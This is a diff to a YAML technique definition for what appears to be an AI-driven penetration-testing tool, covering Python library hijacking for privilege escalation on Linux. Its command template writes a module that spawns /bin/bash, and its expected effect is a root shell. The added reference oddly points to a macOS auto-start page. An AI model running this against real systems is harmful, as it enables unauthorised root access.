@@ -2,15 +2,20 @@ name: python_library_hijack
 category: privesc
 description: Python library hijacking
 preconditions:
-  - os==linux
+- os==linux
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "echo 'import os; os.system("/bin/bash")' > /path/imported_module.py"
-parser: null
+command_template: 'echo ''import os; os.system("/bin/bash")'' > /path/imported_module.py
+
+  '
+parser: generic_parser
 expected_effects:
-  - action_completed
+- python_lib_hijacked
+- root_shell
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "If privileged script imports Python module and PYTHONPATH or the import directory is writable, replace the module with malicious code."
+mechanism: If privileged script imports Python module and PYTHONPATH or the import
+  directory is writable, replace the module with malicious code.
+hacktricks_ref: macos-hardening/macos-auto-start-locations.md
